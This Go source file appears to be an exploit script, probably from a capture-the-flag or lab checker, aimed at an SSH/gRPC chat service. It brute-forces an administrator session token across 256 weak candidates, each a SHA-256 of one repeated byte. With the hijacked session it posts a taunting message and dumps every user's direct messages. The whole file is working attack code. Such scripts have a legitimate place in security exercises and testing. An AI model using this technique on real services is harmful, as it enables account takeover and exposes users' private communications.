package main

import (
	"bufio"
	"checker/pkg/client"
	"checker/service/database"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"log"
	"strings"

	"github.com/acarl005/stripansi"
)

const sessionTokenSize = 32

func generateSessionToken(val byte) string {
	token := make([]byte, sessionTokenSize)
	for i := 0; i < sessionTokenSize; i++ {
		token[i] = val
	}
	tokenHash := sha256.New()
	tokenHash.Write(token)
	return hex.EncodeToString(tokenHash.Sum(nil))
}

func run() error {
	attacker, err := client.GenerateNewUser()
	if err != nil {
		return err
	}

	sshClient, sessIO, ch, err := client.CreateSSHSession(context.Background(), attacker.Name, "localhost", attacker.PrivateKey)
	if err != nil {
		return err
	}
	defer ch.Execute()

	if _, err := fmt.Fprintf(sessIO, "/users\n\r"); err != nil {
		return err
	}
	userChan := make(chan string)
	scanner := bufio.NewScanner(sessIO)
	go func() {
		for scanner.Scan() {
			txt := stripansi.Strip(scanner.Text())
			if strings.Contains(txt, "* ") {
				splitTxt := strings.Split(txt, " ")
				userChan <- splitTxt[2]
			}
		}
		if err := scanner.Err(); err != nil {
			log.Println(err)
		}
		close(userChan)
	}()

	rpcChannel, err := client.OpenRPCChannel(sshClient)
	if err != nil {
		return err
	}
	defer rpcChannel.Close()

	grpcConn, err := client.CreateNewGRPCClient(context.Background(), rpcChannel)
	if err != nil {
		return err
	}
	defer grpcConn.Close()

	adminClient := client.NewAdminClient(grpcConn)

	for i := 0; i < 256; i++ {
		log.Printf("trying: %d", i)
		adminClient.SessionToken = generateSessionToken(byte(i))
		err := adminClient.SendMessageToRoom("default", ":clown: session hijacked :clown:")
		if err != nil {
			log.Println(err)
		} else {
			log.Println("We are in!!!!")
			log.Printf("session token: %s", adminClient.SessionToken)
			for userName := range userChan {
				log.Printf("trying %s", userName)
				err = adminClient.DumpDirectMessages(userName, func(entry *database.MessageEntry) {
					fmt.Println(entry)
				})
			}
			if err != nil {
				return err
			}
			break
		}
	}
	return nil
}

func main() {
	log.Println("starting...")
	if err := run(); err != nil {
		log.Fatal(err)
	}
	log.Println("done.")
}
